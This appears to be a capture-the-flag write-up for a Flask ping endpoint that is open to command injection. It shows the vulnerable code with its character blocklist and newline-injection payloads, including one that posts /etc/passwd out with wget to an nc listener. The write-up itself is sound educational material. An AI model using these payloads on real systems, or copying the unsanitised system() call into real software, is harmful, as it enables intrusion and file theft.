---
title: "TakitoChall CYBEX [ WEB ]"
date: 2022-02-27T18:35:38-05:00
draft: false
---

## __Introduction__

The objective of this challenge is to get an RCE, specifically to get the output of the `cat /etc/passwd` command.

```python
from flask import Flask
from flask import request
from os import system

app = Flask(__name__)

@app.route('/')
def rce():
    ip = request.args.get('ip')

    if ip is None:
        return 'Please use ?ip=127.0.0.1'

    for char in '&;|$()`':
        if char in ip:
            return 'Character {} is blocked'.format(char)

    system('ping -c 1 '+ip)
    return 'Ping sent'

if __name__ == '__main__':
    app.run()
```

Before starting the analysis we can notice at a glance that a ping is performed to the address we set in the `ip` parameter.

## __First sight__

When analyzing the code we notice that in line 14 we have several banned characters such as `&;|$()` and `. This is logical since command injection payloads usually carry these characters, as we can see in the following [link](https://github.com/payloadbox/command-injection-payload-list).

Another option we could try would be to convert them to another format such as base64, unicode, hexadecimal and various conversions that would help us achieve what we are looking for.

## __Exploitation__

In this case we are dealing with a CRLF injection. If you want to know more about this type of web vulnerability you can do so by clicking on the following [link](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a) which will redirect you to the official HackTricks website which has a very good review about this bug.

Once we know what we are dealing with, we can now crack the following code by typing in the `ip=` parameter the following payload:

```
%0Aid
```

![image](https://user-images.githubusercontent.com/88755387/154855417-06bf8edb-aff1-407d-8ded-8e92254209a0.png)

![image](https://user-images.githubusercontent.com/88755387/154855372-70dc930a-1785-4137-99f7-ccaaa5774058.png)

As we can see we have taken the output in the log which would be on the server side but what we are looking for is to print the output on the screen so that the client can view it.

With the following command and raising the port 443 we can get the output to our machine:

```
%0Awget --post-file=/etc/passwd 127.0.0.1:443
```

![image](https://user-images.githubusercontent.com/88755387/154859783-dcaae268-dd39-4616-afbc-63b40e775a54.png)

One line payload:

```
nc -lvp 443 & curl 127.0.0.1:5000/?ip=%0Awget%20--post-file=/etc/passwd%20127.0.0.1:443
```